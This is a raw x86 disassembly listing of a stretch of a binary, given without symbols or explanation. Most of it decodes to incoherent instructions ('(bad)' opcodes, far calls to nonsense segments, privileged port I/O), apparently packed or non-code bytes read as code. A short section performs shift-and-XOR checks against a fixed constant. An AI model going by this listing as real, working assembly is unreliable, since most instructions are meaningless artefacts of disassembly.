  404e94:	repnz and eax,0x98f372f8
  404e9a:	inc    edx
  404e9b:	arpl   WORD PTR [ebp+ebp*8-0x35a6bf19],cx
  404ea2:	ror    BYTE PTR [ecx+0x36b27951],0xaa
  404ea9:	loope  0x404ed0
  404eab:	daa    
  404eac:	call   0xd2f7:0xe6c844eb
  404eb3:	stc    
  404eb4:	(bad)
  404eb8:	call   0x7f4c:0x48e94816
  404ebf:	out    dx,al
  404ec0:	pop    eax
  404ec1:	sub    ebp,esi
  404ec3:	mov    ch,BYTE PTR [ecx]
  404ec5:	adc    al,BYTE PTR [edi-0x39]
  404ec8:	and    dl,BYTE PTR [eax]
  404eca:	jmp    0xf7b2:0x687984a2
  404ed1:	add    esp,esp
  404ed3:	mov    bh,0x1
  404ed5:	xchg   esp,eax
  404ed6:	add    DWORD PTR [edx+0x3ec19ffb],0xffffffa5
  404edd:	lds    esp,FWORD PTR [esi-0x360205c6]
  404ee3:	pop    ss
  404ee4:	test   al,al
  404ee6:	xor    dl,BYTE PTR ds:0x611ad251
  404eec:	inc    ebp
  404eed:	push   eax
  404eee:	inc    esi
  404eef:	rol    BYTE PTR [edx-0x5d],0x87
  404ef3:	test   BYTE PTR [edx],ch
  404ef5:	lds    edi,FWORD PTR [edi]
  404ef7:	jb     0x404ec8
  404ef9:	xchg   ebp,eax
  404efa:	clc    
  404efb:	outs   dx,WORD PTR ds:[esi]
  404efd:	inc    ebx
  404efe:	or     bh,BYTE PTR [eax+0x11]
  404f01:	fimul  WORD PTR [edi]
  404f03:	sbb    dh,BYTE PTR [ebx]
  404f05:	adc    al,0xe6
  404f07:	jecxz  0x404ec3
  404f09:	mov    dh,0x29
  404f0b:	pushf  
  404f0c:	or     al,cl
  404f0e:	xchg   edi,eax
  404f0f:	sahf   
  404f10:	push   ss
  404f11:	ja     0x404eab
  404f13:	ret    0x8279
  404f16:	inc    esp
  404f17:	inc    ecx
  404f18:	(bad)  
  404f19:	and    esi,edi
  404f1b:	scas   al,BYTE PTR es:[edi]
  404f1c:	push   edx
  404f1d:	bound  edx,QWORD PTR [esi]
  404f1f:	mov    DWORD PTR [eax+0x23ae7a87],esp
  404f25:	mov    edx,0x10290798
  404f2a:	add    ecx,esp
  404f2c:	sbb    al,0x27
  404f2e:	pusha  
  404f2f:	xchg   ebp,eax
  404f30:	pop    edx
  404f31:	push   edi
  404f32:	cmp    DWORD PTR [edi+0x1d],ecx
  404f35:	sbb    ah,BYTE PTR [ecx-0x18ae3d67]
  404f3b:	retf   0xd51f
  404f3e:	adc    BYTE PTR [eax-0x14b45732],bl
  404f44:	int    0xe
  404f46:	bound  esp,QWORD PTR [esi+ebx*1-0x2d]
  404f4a:	call   FWORD PTR [edi+ebx*1-0x5a]
  404f4e:	jbe    0x404f5e
  404f50:	push   0xffffffdc
  404f52:	xchg   edi,edi
  404f54:	adc    eax,ebp
  404f56:	sub    BYTE PTR [eax-0x210db4e6],bh
  404f5c:	mov    ah,0x48
  404f5e:	inc    esp
  404f5f:	xchg   esi,eax
  404f60:	stc    
  404f61:	jne    0x404f94
  404f63:	iret   
  404f64:	adc    bl,BYTE PTR [esi+eiz*1+0x34c60a2c]
  404f6b:	xchg   ebx,eax
  404f6c:	fimul  DWORD PTR [edi-0x62]
  404f6f:	cmp    BYTE PTR [esp+edi*1-0x6f58ed18],cl
  404f76:	sti    
  404f77:	icebp  
  404f78:	add    ecx,DWORD PTR [edx]
  404f7a:	fdivr  st(2),st
  404f7c:	cmp    DWORD PTR ds:0x4bdab73a,esp
  404f82:	data16 jae 0x404f11
  404f85:	jl     0x404f63
  404f87:	xchg   edx,eax
  404f88:	dec    edi
  404f89:	sub    BYTE PTR [edi],ah
  404f8b:	ss mov bl,0xe7
  404f8e:	bound  edx,QWORD PTR gs:[ecx-0x46]
  404f92:	outs   dx,BYTE PTR ds:[esi]
  404f93:	arpl   WORD PTR [ebx-0x60],si
  404f96:	movaps xmm3,XMMWORD PTR [edx]
  404f99:	test   bh,ah
  404f9b:	nop
  404f9c:	push   eax
  404f9d:	ins    DWORD PTR es:[edi],dx
  404f9e:	mov    ah,0x45
  404fa0:	das    
  404fa1:	push   ebp
  404fa2:	ins    BYTE PTR es:[edi],dx
  404fa3:	test   eax,0x85756851
  404fa8:	out    dx,ax
  404faa:	xchg   dh,al
  404fac:	cs pop esp
  404fae:	inc    edx
  404faf:	mov    fs,WORD PTR [ecx]
  404fb1:	pop    ecx
  404fb2:	pop    esp
  404fb3:	xor    DWORD PTR [edx-0x2b],0xf1b87944
  404fba:	pop    edi
  404fbb:	int3   
  404fbc:	(bad)  
  404fbe:	adc    al,0x71
  404fc0:	outs   dx,DWORD PTR ds:[esi]
  404fc1:	adc    bl,BYTE PTR [ebp+0x443f3b5]
  404fc7:	inc    ebx
  404fc8:	pushf  
  404fc9:	(bad)  
  404fca:	stc    
  404fcb:	test   eax,0xe884c36e
  404fd0:	or     DWORD PTR [edx+0x19],ecx
  404fd3:	push   ss
  404fd4:	retf   
  404fd5:	or     DWORD PTR [esi+0x42],ebp
  404fd8:	sub    eax,0xa30175c2
  404fdd:	or     al,0xc6
  404fdf:	enter  0x6285,0x7e
  404fe3:	xlat   BYTE PTR ds:[ebx]
  404fe4:	sub    DWORD PTR [edi+ecx*2-0x57ce2cb8],0xffffffb8
  404fec:	(bad)  
  404fed:	ins    DWORD PTR es:[edi],dx
  404fee:	lods   eax,DWORD PTR ds:[esi]
  404fef:	leave  
  404ff0:	out    dx,al
  404ff1:	fdivr  QWORD PTR [ebp+0x42bb6815]
  404ff7:	cdq    
  404ff8:	sub    DWORD PTR [ebp-0x77],ecx
  404ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffc:	cmp    ah,ah
  404ffe:	(bad)  
  404fff:	repz dec edx
  405001:	inc    ecx
  405002:	inc    ecx
  405003:	mov    eax,0x9bfe3d2f
  405008:	icebp  
  405009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500a:	mov    edi,0xace36abc
  40500f:	push   edi
  405010:	mov    eax,ds:0xc15cea60
  405015:	jmp    0xc28b:0x90458902
  40501c:	or     eax,DWORD PTR [ebp+0x14]
  40501f:	mov    DWORD PTR [ebp-0x5c],edx
  405022:	mov    DWORD PTR [ebp-0x6c],eax
  405025:	mov    eax,DWORD PTR [ebp-0x70]
  405028:	cmp    DWORD PTR [ebp-0x68],eax
  40502b:	jne    0x40503d
  405031:	mov    eax,DWORD PTR [ebp-0x6c]
  405034:	cmp    DWORD PTR [ebp-0x64],eax
  405037:	je     0x405322
  40503d:	mov    eax,DWORD PTR [ebp+0x8]
  405040:	mov    edx,DWORD PTR [ebp+0xc]
  405043:	mov    edx,DWORD PTR [ebp-0x4]
  405046:	mov    edx,DWORD PTR [edx+0x3c]
  405049:	lea    eax,[edx+eax*8+0x78]
  40504d:	mov    edx,DWORD PTR [ebp-0x4]
  405050:	jmp    0x4052fa
  405055:	push   0x5d
  405057:	(bad)  
  405058:	push   ebp
  405059:	in     al,dx
  40505a:	push   ebp
  40505b:	jns    0x4050da
  40505d:	in     al,0xfe
  40505f:	pop    edi
  405060:	xor    DWORD PTR [ecx+0x58],eax
  405063:	sbb    DWORD PTR [ebp-0x26],eax
  405066:	or     bh,BYTE PTR [ebx-0x44402f45]
  40506c:	mov    ebx,0xb251d11
  405071:	sbb    dh,BYTE PTR ds:0x85b0ca9f
  405077:	loopne 0x4050c7
  405079:	jp     0x40509a
  40507b:	retf   
  40507c:	xor    cl,al
  40507e:	xchg   BYTE PTR [ecx+0xa],ch
  405081:	int3   
  405082:	(bad)  
  405083:	push   esi
  405084:	out    dx,al
  405085:	push   ds
  405086:	and    bh,BYTE PTR [ecx+0xc]
  405089:	sar    dl,0xdd
  40508c:	cmp    BYTE PTR [edi+edi*1+0x5c476d7b],dh
  405093:	jl     0x405025
  405095:	mov    edx,0xb006857e
  40509a:	je     0x40506b
  40509c:	and    al,0x38
  40509e:	out    0xce,eax
  4050a0:	xchg   DWORD PTR [esi+0x6954b683],esp
  4050a6:	popa   
  4050a7:	sahf   
  4050a8:	scas   al,BYTE PTR es:[edi]
  4050a9:	mov    ds:0xec935ba8,eax
  4050ae:	das    
  4050af:	adc    ch,BYTE PTR [eax]
  4050b1:	jg     0x4050b7
  4050b3:	ins    BYTE PTR es:[edi],dx
  4050b4:	xchg   ebx,eax
  4050b5:	jmp    0x3b3f4a63
  4050ba:	in     al,dx
  4050bb:	mov    cl,0xd2
  4050bd:	adc    DWORD PTR [esi+edx*1-0xd],ecx
  4050c1:	mov    ecx,0x24982add
  4050c6:	js     0x4050d9
  4050c8:	cmp    eax,0xa1d130b7
  4050cd:	pop    ds
  4050ce:	adc    al,0x2d
  4050d0:	push   edi
  4050d1:	add    ecx,DWORD PTR [ebx+0x3f]
  4050d4:	dec    ebp
  4050d5:	jg     0x405119
  4050d7:	pushf  
  4050d8:	out    0xbf,al
  4050da:	test   eax,0xafbe72b2
  4050df:	xor    eax,0x682613c7
  4050e4:	jle    0x405088
  4050e6:	jne    0x4050d8
  4050e8:	sub    BYTE PTR [edx],ah
  4050ea:	mov    WORD PTR [eax],?
  4050ec:	int3   
  4050ed:	sbb    BYTE PTR [edx+0x0],cl
  4050f0:	pop    ds
  4050f1:	mov    dl,0x32
  4050f3:	and    al,0xe2
  4050f5:	retf   0xd5a6
  4050f8:	sub    al,al
  4050fa:	cmp    al,0xe9
  4050fc:	fs push esp
  4050fe:	inc    ebp
  4050ff:	push   edx
  405100:	and    al,BYTE PTR [ebp+0x79c61e88]
  405106:	jmp    0xc160b0a8
  40510b:	or     edi,DWORD PTR [edi-0x62cef6d]
  405111:	adc    ecx,DWORD PTR [edi-0x5e]
  405114:	lahf   
  405115:	retf   0x8edd
  405118:	lds    edx,FWORD PTR [ebx]
  40511a:	lea    esp,[ebx]
  40511c:	aas    
  40511d:	icebp  
  40511e:	(bad)  
  40511f:	jp     0x405152
  405121:	cld    
  405122:	aad    0xc8
  405124:	test   ebx,0x15333d3b
  40512a:	cmp    eax,0x686e2e50
  40512f:	sub    bl,al
  405131:	int3   
  405132:	stos   DWORD PTR es:[edi],eax
  405133:	bound  ebx,QWORD PTR [eax+0x2d]
  405136:	jb     0x405178
  405138:	or     ch,BYTE PTR [ebx+0x324aa0c9]
  40513e:	(bad)  
  40513f:	cmp    al,0xb2
  405141:	cdq    
  405142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405143:	cmp    BYTE PTR [ebx-0x698c6e49],dl
  405149:	mov    ds:0x801f341d,al
  40514e:	xchg   esi,eax
  40514f:	(bad)  
  405150:	lds    edi,FWORD PTR [esi]
  405152:	adc    BYTE PTR [esi],0x51
  405155:	adc    eax,0xe431d958
  40515a:	ds jle 0x4050f8
  40515d:	ss dec edx
  40515f:	sbb    DWORD PTR [ebx],ebp
  405161:	hlt    
  405162:	jne    0x405114
  405164:	jmp    0x4051a3
  405166:	push   0x92f7f4f
  40516b:	and    dl,BYTE PTR [ebp+0x2e3f1116]
  405171:	mov    dh,0x99
  405173:	mov    WORD PTR [ebx+0x74],?
  405176:	mov    esp,ss
  405178:	mov    edx,0x76379870
  40517d:	test   al,0xa0
  40517f:	jae    0x405159
  405181:	int    0x9f
  405183:	add    bl,BYTE PTR [eax+ecx*4+0x5f60f29f]
  40518a:	adc    BYTE PTR [edi+0x6e],al
  40518d:	rcr    DWORD PTR cs:[edx-0x80],1
  405191:	jns    0x40514c
  405193:	enter  0xb184,0x36
  405197:	imul   BYTE PTR [edi-0x12a05dfe]
  40519d:	repz inc edi
  40519f:	(bad)  
  4051a0:	jmp    0x405172
  4051a2:	xchg   edi,eax
  4051a3:	ja     0x405199
  4051a5:	dec    ebx
  4051a6:	call   0x41a:0xfe8d4d95
  4051ad:	xor    eax,0x20cec952
  4051b2:	cmp    BYTE PTR [esi],bh
  4051b4:	int3   
  4051b5:	xchg   ebx,eax
  4051b6:	je     0x405210
  4051b8:	sar    DWORD PTR [esi-0x4975f3d1],cl
  4051be:	xchg   esp,eax
  4051bf:	pop    ecx
  4051c0:	(bad)  
  4051c2:	xor    esi,DWORD PTR [edx+0x14]
  4051c5:	and    bl,BYTE PTR [eax+eax*8-0x2f]
  4051c9:	(bad)  
  4051ca:	fadd   DWORD PTR [edi+0x63]
  4051cd:	repnz push 0x3bc50e69
  4051d3:	lea    ebx,[esi+0x6bb03609]
  4051d9:	loope  0x4051ac
  4051db:	inc    esi
  4051dc:	loope  0x40517f
  4051de:	mov    bl,0x1a
  4051e0:	stc    
  4051e1:	jmp    0x40516e
  4051e3:	fst    DWORD PTR [edx]
  4051e5:	inc    ebp
  4051e6:	push   esi
  4051e7:	out    0xed,al
  4051e9:	mov    ch,0x39
  4051eb:	ins    BYTE PTR es:[edi],dx
  4051ec:	xchg   ebp,eax
  4051ed:	push   ss
  4051ee:	xor    eax,0xc3148a1
  4051f3:	mov    bh,0x47
  4051f5:	xor    eax,0xdf364db0
  4051fa:	aaa    
  4051fb:	push   es
  4051fc:	push   esp
  4051fd:	adc    eax,0x9f05a2b2
  405202:	nop
  405203:	xor    ecx,DWORD PTR [edx-0x27]
  405206:	call   0x73e:0xc8637a24
  40520d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40520e:	mov    ch,0xed
  405210:	dec    edi
  405211:	gs lahf 
  405213:	cmp    al,0xb4
  405215:	lods   al,BYTE PTR ds:[esi]
  405216:	sar    DWORD PTR [esi+ecx*8-0x6f],0x73
  40521b:	adc    edx,DWORD PTR [ebx-0x67]
  40521e:	xor    BYTE PTR [edx],bh
  405220:	shr    edi,1
  405222:	lea    ecx,[ecx]
  405224:	popa   
  405225:	sbb    al,0x5f
  405227:	test   eax,0xe54d6b80
  40522c:	push   esi
  40522d:	cli    
  40522e:	adc    edi,DWORD PTR [esp+edi*8-0x25b44e58]
  405235:	aaa    
  405236:	fdivr  QWORD PTR [edx+0x7884f1d5]
  40523c:	add    DWORD PTR es:[edx],edi
  40523f:	std    
  405240:	test   al,0x84
  405242:	xor    edi,edx
  405244:	adc    BYTE PTR [esi-0x114df35b],ch
  40524a:	sbb    ch,BYTE PTR [eax]
  40524c:	cmp    al,0xa4
  40524e:	push   esi
  40524f:	adc    BYTE PTR [esi+esi*2+0x6d],bh
  405253:	jle    0x405270
  405255:	loope  0x4051e0
  405257:	or     DWORD PTR [esi+0x54],0xffffffb6
  40525b:	repnz inc edx
  40525d:	xchg   ecx,eax
  40525e:	loope  0x4052b9
  405260:	in     eax,dx
  405261:	fwait
  405262:	mov    BYTE PTR [ebp-0x639b45dc],cl
  405268:	scas   eax,DWORD PTR es:[edi]
  405269:	jmp    0xc2ea:0xbe807733
  405270:	inc    ecx
  405271:	inc    edx
  405272:	xor    bh,BYTE PTR [ebp-0xc7d47c6]
  405278:	in     eax,0xfe
  40527a:	add    DWORD PTR [esp+ebx*8-0x36a7c0cd],ecx
  405281:	popa   
  405282:	dec    edi
  405283:	nop
  405284:	(bad)  
  405286:	(bad)  
  405287:	aam    0x37
  405289:	inc    edi
  40528a:	sub    eax,edi
  40528c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40528d:	or     al,0x38
  40528f:	syscall 
  405291:	popa   
  405292:	lods   al,BYTE PTR ds:[esi]
  405293:	xchg   ecx,eax
  405294:	int    0x48
  405296:	jae    0x405219
  405298:	ins    BYTE PTR es:[edi],dx
  405299:	sub    eax,0x4541f06a
  40529e:	call   FWORD PTR [ebx-0x35]
  4052a1:	adc    eax,0x33ad136e
  4052a6:	adc    ecx,edi
  4052a8:	jmp    0x405321
  4052aa:	scas   eax,DWORD PTR es:[edi]
  4052ab:	pop    eax
  4052ac:	inc    edx
  4052ad:	or     DWORD PTR [esi],ebp
  4052af:	mul    DWORD PTR [ebp+0x57864dbe]
  4052b5:	cmp    cl,BYTE PTR [edx]
  4052b7:	cmp    bh,dl
  4052b9:	bound  edi,QWORD PTR [ebp+0x2d]
  4052bc:	xchg   bh,ch
  4052be:	xchg   ebp,eax
  4052bf:	test   BYTE PTR [eax],al
  4052c1:	jecxz  0x405243
  4052c3:	sbb    DWORD PTR [eax],0xffffffa1
  4052c6:	outs   dx,BYTE PTR ds:[esi]
  4052c7:	sti    
  4052c8:	sub    al,dh
  4052ca:	jae    0x4052c5
  4052cc:	or     cl,bh
  4052ce:	fmulp  st(3),st
  4052d0:	dec    ebx
  4052d1:	pop    ebp
  4052d2:	lods   eax,DWORD PTR ds:[esi]
  4052d3:	cmp    al,0x92
  4052d5:	sbb    DWORD PTR [eax-0x5d],esi
  4052d8:	pop    esp
  4052d9:	lds    ecx,FWORD PTR [esp+ebp*8-0x2295f8f5]
  4052e0:	test   ah,dl
  4052e2:	push   edi
  4052e3:	push   ds
  4052e4:	or     ebx,ecx
  4052e6:	jne    0x40533f
  4052e8:	dec    ebx
  4052e9:	call   0x87a75005
  4052ee:	add    bh,BYTE PTR [edx]
  4052f0:	das    
  4052f1:	ds xchg esi,eax
  4052f3:	fidiv  WORD PTR [ebp-0x4f]
  4052f6:	jmp    0x8c073859
  4052fb:	add    al,0x2
  4052fd:	mov    DWORD PTR [ebp-0x24],eax
  405300:	mov    eax,DWORD PTR [esi]
  405302:	mov    edx,DWORD PTR [esi+0x4]
  405305:	shrd   eax,edx,0x2
  405309:	mov    DWORD PTR [ebp+0x14],eax
  40530c:	mov    eax,DWORD PTR [esi]
  40530e:	xor    DWORD PTR [ebp+0x14],edi
  405311:	shr    edx,0x2
  405314:	mov    edx,DWORD PTR [esi+0x4]
  405317:	xor    edx,edx
  405319:	shl    eax,0x1e
  40531c:	or     edx,DWORD PTR [ebp+0x14]
  40531f:	mov    DWORD PTR [ebp-0x28],edx
  405322:	mov    eax,DWORD PTR [ebp-0x24]
  405325:	mov    eax,DWORD PTR [ebp-0x24]
  405328:	xor    edx,edx
  40532a:	shld   edx,eax,0x2
  40532e:	xor    edx,ecx
  405330:	mov    DWORD PTR [ebp+0xc],edx
  405333:	mov    edx,DWORD PTR [esi]
  405335:	shl    eax,0x2
  405338:	mov    DWORD PTR [ebp+0x10],edx
  40533b:	mov    edx,DWORD PTR [esi+0x4]
  40533e:	xor    eax,0xcb89b676
  405343:	mov    DWORD PTR [ebp+0x14],edx
  405346:	cmp    eax,DWORD PTR [ebp+0x10]
  405349:	jne    0x4056a6
  40534f:	mov    eax,edx
  405351:	cmp    DWORD PTR [ebp+0xc],eax
  405354:	jne    0x4056a6
  40535a:	mov    eax,DWORD PTR [esi]
  40535c:	mov    edx,DWORD PTR [esi+0x4]
  40535f:	mov    eax,DWORD PTR [esi]
  405361:	mov    edx,DWORD PTR [esi+0x4]
  405364:	mov    edx,eax
  405366:	xor    eax,eax
  405368:	shl    edx,0x1e
  40536b:	mov    DWORD PTR [ebp+0x10],eax
  40536e:	mov    eax,DWORD PTR [esi]
  405370:	xor    edx,0x80000000
  405376:	mov    DWORD PTR [ebp+0x14],edx
  405379:	mov    edx,DWORD PTR [esi+0x4]
  40537c:	jmp    0x405626
  405381:	aas    
  405382:	std    
  405383:	mov    al,ds:0x6d97b886
  405388:	cmp    eax,0x6fa37f88
  40538d:	dec    ebp
  40538e:	dec    ebp
  40538f:	inc    edi
  405390:	add    eax,0xbbbb14f0
  405395:	sar    BYTE PTR [edi-0x33e44445],1
  40539b:	clc    
  40539c:	adc    BYTE PTR [esi+0x5e],dh
  40539f:	adc    esp,DWORD PTR ds:0x1616db03
  4053a5:	(bad)  
  4053a6:	(bad)  [ebp-0x2]
  4053a9:	test   eax,0x5ed22bee
  4053ae:	push   edi
  4053af:	mov    ch,0x8f
  4053b1:	(bad)  
  4053b2:	aam    0xc9
  4053b4:	ffreep st(5)
  4053b6:	adc    eax,0x5ca558e5
  4053bb:	icebp  
  4053bc:	xchg   ebx,eax
  4053bd:	or     ah,BYTE PTR [ebx+0x27b4a499]
  4053c3:	call   0xf77:0xcf1b2744
  4053ca:	add    edi,DWORD PTR [ebx-0x528e3492]
  4053d0:	retf   0xd157
  4053d3:	inc    ebx
  4053d4:	in     al,dx
  4053d5:	jle    0x40544b
  4053d7:	repz mov bl,0xbb
  4053da:	pop    esi
  4053db:	aad    0xe5
  4053dd:	ins    DWORD PTR es:[edi],dx
  4053de:	xor    ebp,DWORD PTR [eax+0x1]
  4053e1:	fild   WORD PTR [edi-0x57]
  4053e4:	inc    eax
  4053e5:	loop   0x4053a4
  4053e7:	out    0x55,eax
  4053e9:	ds rcr esp,cl
  4053ec:	xchg   esp,eax
  4053ed:	mov    dh,0xaa
  4053ef:	jmp    0x68df:0x209dedd
  4053f6:	sbb    ah,0x10
  4053f9:	nop
  4053fa:	inc    edx
  4053fb:	mov    ds:0x295f524a,eax
  405400:	mov    ebp,0x2ab3574
  405405:	pop    esi
  405406:	jns    0x4053aa
  405408:	cmc    
  405409:	adc    dl,bh
  40540b:	je     0x40540e
  40540d:	sbb    al,0x28
  40540f:	call   0x8ada:0x5bf03072
  405416:	iret   
  405417:	ret    
  405418:	scas   al,BYTE PTR es:[edi]
  405419:	fisubr WORD PTR [ecx+0x67]
  40541c:	sub    eax,0x7e6eab3b
  405421:	cmp    DWORD PTR [edx-0x28dce9a0],0x34
  405428:	push   esp
  405429:	dec    esi
  40542a:	cdq    
  40542b:	and    eax,0x39103cc2
  405430:	cmp    al,0x32
  405432:	pop    es
  405433:	hlt    
  405434:	mov    cl,0x2e
  405436:	push   es
  405437:	mov    ah,0x3b
  405439:	rcr    DWORD PTR [edx+0x46],1
  40543c:	dec    esi
  40543d:	scas   eax,DWORD PTR es:[edi]
  40543e:	mov    esi,esi
  405440:	xlat   BYTE PTR ds:[ebx]
  405441:	fistp  WORD PTR [ebx+0x19]
  405444:	xchg   ebx,edi
  405446:	out    0xc8,al
  405448:	mov    al,0xc
  40544a:	inc    ecx
  40544b:	aaa    
  40544c:	jb     0x405445
  40544e:	inc    ebp
  40544f:	inc    ch
  405451:	mov    ebx,0xb45f4ca8
  405456:	push   eax
  405457:	inc    eax
  405458:	sub    al,0xab
  40545a:	pmulhuw mm4,QWORD PTR [edi]
  40545d:	jno    0x4054d9
  40545f:	pushf  
  405460:	stos   DWORD PTR es:[edi],eax
  405461:	test   DWORD PTR [esi],ebp
  405463:	jg     0x405493
  405465:	(bad)  [edi-0xa6ba6d8]
  40546b:	in     al,0x10
  40546d:	call   0x4946:0xe92d9300
  405474:	jge    0x4054c2
  405476:	hlt    
  405477:	xor    ch,ah
  405479:	fs sti 
  40547b:	cld    
  40547c:	cmp    eax,0xc6e26347
  405481:	fiadd  WORD PTR [ebx]
  405483:	js     0x405495
  405485:	push   cs
  405486:	mov    ecx,0x1b1543ac
  40548b:	xor    edx,0xffffffa4
  40548e:	loope  0x4054ee
  405490:	fbstp  TBYTE PTR [ebx]
  405492:	xchg   ebx,eax
  405493:	mov    ch,0xff
  405495:	push   ebp
  405496:	icebp  
  405497:	(bad)  
  405498:	std    
  405499:	push   ds
  40549a:	sub    BYTE PTR [eax-0x582b06e7],0x27
  4054a1:	ins    DWORD PTR es:[edi],dx
  4054a2:	stos   DWORD PTR es:[edi],eax
  4054a3:	mov    al,bh
  4054a5:	bound  ebx,QWORD PTR [ecx]
  4054a7:	add    al,BYTE PTR [eax+0x5d]
  4054aa:	int3   
  4054ab:	xlat   BYTE PTR ds:[ebx]
  4054ac:	sub    BYTE PTR [ebx-0x14d39cdc],ch
  4054b2:	call   0xfa2b2ad1
  4054b7:	sti    
  4054b8:	sar    eax,cl
  4054ba:	jecxz  0x40546f
  4054bc:	mov    esp,eax
  4054be:	dec    esp
  4054bf:	jle    0x4054b3
  4054c1:	pushf  
  4054c2:	xlat   BYTE PTR ds:[ebx]
  4054c3:	fs mov cl,0xd
  4054c7:	loopne 0x405460
  4054c9:	inc    ebx
  4054ca:	test   BYTE PTR [esi+0x4a],al
  4054cd:	add    ch,ch
  4054cf:	rcl    DWORD PTR [ebx-0xd],1
  4054d2:	mov    ah,0x8c
  4054d4:	mov    dl,0xbf
  4054d6:	out    0x63,eax
  4054d8:	inc    ebx
  4054d9:	push   ecx
  4054da:	pop    esp
  4054db:	ins    BYTE PTR es:[edi],dx
  4054dc:	ret    0xb7cb
  4054df:	pop    ebp
  4054e0:	ins    DWORD PTR es:[edi],dx
  4054e1:	xchg   ecx,eax
  4054e2:	fidiv  WORD PTR [edx-0x48]
  4054e5:	sub    DWORD PTR [eax+0x1b],0x3dda687d
  4054ec:	pop    ecx
  4054ed:	dec    edi
  4054ee:	mov    dh,0x0
  4054f0:	sbb    esi,eax
  4054f2:	popa   
  4054f3:	ins    DWORD PTR es:[edi],dx
  4054f4:	popf   
  4054f5:	jle    0x405572
  4054f7:	in     al,0xc2
  4054f9:	fcomp  st(4)
  4054fb:	bound  ebp,QWORD PTR [edx]
  4054fd:	or     DWORD PTR [ecx],edi
  4054ff:	xchg   BYTE PTR [edi+0x21],ch
  405502:	in     al,0xc1
  405504:	xchg   esp,eax
  405505:	cdq    
  405506:	stos   DWORD PTR es:[edi],eax
  405507:	and    eax,0xabf00760
  40550c:	pop    edx
  40550d:	shr    DWORD PTR [edi-0x5732fa71],0x83
  405514:	int3   
  405515:	jbe    0x405519
  405517:	pop    ecx
  405518:	fwait
  405519:	or     edx,ebp
  40551b:	dec    edx
  40551c:	(bad)  
  40551d:	adc    BYTE PTR [edi-0x405f0561],ch
  405523:	int    0xe
  405525:	jae    0x4054d2
  405527:	(bad)  
  405528:	jp     0x405557
  40552a:	jle    0x4054b3
  40552c:	xchg   esi,eax
  40552d:	xchg   edx,eax
  40552e:	jne    0x40550e
  405530:	lods   al,BYTE PTR ds:[esi]
  405531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405532:	cmp    BYTE PTR es:[esi+0x5c],bh
  405536:	jno    0x4055ab
  405538:	out    0xe8,al
  40553a:	hlt    
  40553b:	push   ebx
  40553c:	jp     0x405518
  40553e:	mov    WORD PTR [esi+0x36],gs
  405541:	inc    edi
  405542:	jns    0x4055b2
  405544:	push   0xffffffe8
  405546:	daa    
  405547:	or     eax,0xce84ab07
  40554c:	cmp    BYTE PTR [ebx+0x21],dh
  40554f:	ror    esp,cl
  405551:	mov    ebx,0xc64667d0
  405556:	in     eax,dx
  405557:	pop    ecx
  405558:	push   ebx
  405559:	adc    al,0x2a
  40555b:	adc    DWORD PTR [ecx-0x276b7cba],edi
  405561:	mov    eax,DWORD PTR [esi+0x54]
  405564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405565:	icebp  
  405566:	xor    ebx,0xffffffca
  405569:	and    BYTE PTR [ebx-0x14558d59],al
  40556f:	pop    DWORD PTR [ebp+ecx*2+0x2d555d9b]
  405576:	sub    BYTE PTR [ebx+0x4a],ah
  405579:	and    dh,BYTE PTR [esi]
  40557b:	scas   eax,DWORD PTR es:[edi]
  40557c:	pop    esi
  40557d:	outs   dx,BYTE PTR ds:[esi]
  40557e:	push   0x5d
  405580:	pop    esi
  405581:	pop    edi
  405582:	dec    edx
  405583:	mov    ch,0xcd
  405585:	outs   dx,BYTE PTR ds:[esi]
  405586:	ja     0x405573
  405588:	mov    ds:0x7c3d8777,al
  40558d:	jo     0x4055c7
  40558f:	(bad)  
  405590:	dec    ebx
  405591:	pop    ds
  405592:	mov    dl,BYTE PTR [esi]
  405594:	int3   
  405595:	mov    DWORD PTR [edx+0x52f02af6],ecx
  40559b:	ret    
  40559c:	jbe    0x405537
  40559e:	cmp    al,0x91
  4055a0:	mov    al,ds:0xeb418022
  4055a5:	(bad)  
  4055a6:	xchg   edx,eax
  4055a7:	xchg   esi,eax
  4055a8:	pop    ebp
  4055a9:	in     eax,dx
  4055aa:	pop    ds
  4055ab:	or     edi,DWORD PTR [ecx]
  4055ad:	pop    ss
  4055ae:	mov    esp,0xa995da06
  4055b3:	fist   WORD PTR [ebx+0x73fcab1f]
  4055b9:	idiv   dh
  4055bb:	dec    esi
  4055bc:	lods   al,BYTE PTR ds:[esi]
  4055bd:	or     dh,BYTE PTR ds:0x5a50fd8
  4055c3:	xor    al,bl
  4055c5:	jbe    0x40559e
  4055c7:	fimul  DWORD PTR [ebx+0x79]
  4055ca:	adc    edi,ecx
  4055cc:	or     ecx,DWORD PTR [edx+0x5c]
  4055cf:	pusha  
  4055d0:	mov    ds,eax
  4055d2:	out    0x0,eax
  4055d4:	xor    esi,DWORD PTR [ebx]
  4055d6:	outs   dx,DWORD PTR ds:[esi]
  4055d7:	rol    BYTE PTR [eax],0x1
  4055da:	mov    ds:0x5cec6b5,al
  4055df:	fsubr  st,st(0)
  4055e1:	jp     0x405618
  4055e3:	pop    ss
  4055e4:	aam    0x4c
  4055e6:	add    BYTE PTR [ecx],0xa7
  4055e9:	add    ch,BYTE PTR [ecx-0x1bbba8a]
  4055ef:	aam    0x26
  4055f1:	lods   eax,DWORD PTR ds:[esi]
  4055f2:	scas   eax,DWORD PTR es:[edi]
  4055f3:	push   esp
  4055f4:	cmp    ch,0xd4
  4055f7:	(bad)  
  4055f8:	jl     0x405672
  4055fa:	(bad)  
  4055fc:	imul   ax,WORD PTR [ebx-0x5ba80],0x6b
  405604:	ins    DWORD PTR es:[edi],dx
  405605:	jns    0x40558e
  405607:	xlat   BYTE PTR ds:[ebx]
  405608:	xchg   DWORD PTR [esi],eax
  40560a:	test   DWORD PTR [edi+0x7bb6cf8e],edi
  405610:	in     al,0x72
  405612:	(bad)  
  405613:	sbb    al,0xdb
  405615:	cmc    
  405616:	out    dx,al
  405617:	rcl    BYTE PTR [ebp+0x16495c1],1
  40561d:	push   es
  40561e:	mov    bl,0x27
  405620:	fldcw  WORD PTR [edi+0x24]
  405623:	xchg   esp,eax
  405624:	pushf  
  405625:	loopne 0x40565c
  405627:	ja     0x4055df
